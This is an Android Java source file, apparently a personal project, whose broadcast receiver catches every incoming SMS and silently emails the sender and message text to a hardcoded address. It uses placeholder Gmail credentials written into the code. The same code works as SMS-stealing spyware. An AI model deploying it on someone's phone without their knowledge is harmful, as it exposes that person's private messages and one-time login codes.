package rr.textlistener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;


import javax.mail.AuthenticationFailedException;
import javax.mail.MessagingException;

/**
 * Created by rosha on 6/23/2017.
 */

public class SmsListener extends BroadcastReceiver {

    // Get the object of SmsManager
    final SmsManager sms = SmsManager.getDefault();

    public void onReceive(Context context, Intent intent) {

        // Retrieves a map of extended data from the intent.
        final Bundle bundle = intent.getExtras();

        try {

            if (bundle != null) {

                final Object[] pdusObj = (Object[]) bundle.get("pdus");

                for (int i = 0; i < pdusObj.length; i++) {

                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);

                    String senderNum = currentMessage.getDisplayOriginatingAddress();
                    String message = currentMessage.getDisplayMessageBody();

                    sendMessage("Sender : " + senderNum + ",\n\n\n Message : " + message);

                }
            }

        } catch (Exception e) {
            Log.e("SMS Listener", "Exception " +e);

        }
    }

    private void sendMessage(String body) {
        String[] recipients = { "receiver_email_Here@gmail.com" };

        SendEmailAsyncTask email = new SendEmailAsyncTask();
        email.m = new Mail("sender_email_here@gmail.com", "sender_password");
        email.m.set_from("Sent_From_Email@gmail.com");
        email.m.setBody(body);
        email.m.set_to(recipients);
        email.m.set_subject("New Text Received");
        email.execute();
    }
}


class SendEmailAsyncTask extends AsyncTask<Void, Void, Boolean> {
    Mail m;
    MainActivity activity;

    public SendEmailAsyncTask() {
    }

    @Override
    protected Boolean doInBackground(Void... params) {
        try {

            m.send();

            return true;
        } catch (AuthenticationFailedException e) {
            Log.e(SendEmailAsyncTask.class.getName(), "Bad account details");
            e.printStackTrace();
            return false;
        } catch (MessagingException e) {
            Log.e(SendEmailAsyncTask.class.getName(), "Email failed");
            e.printStackTrace();
            return false;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
}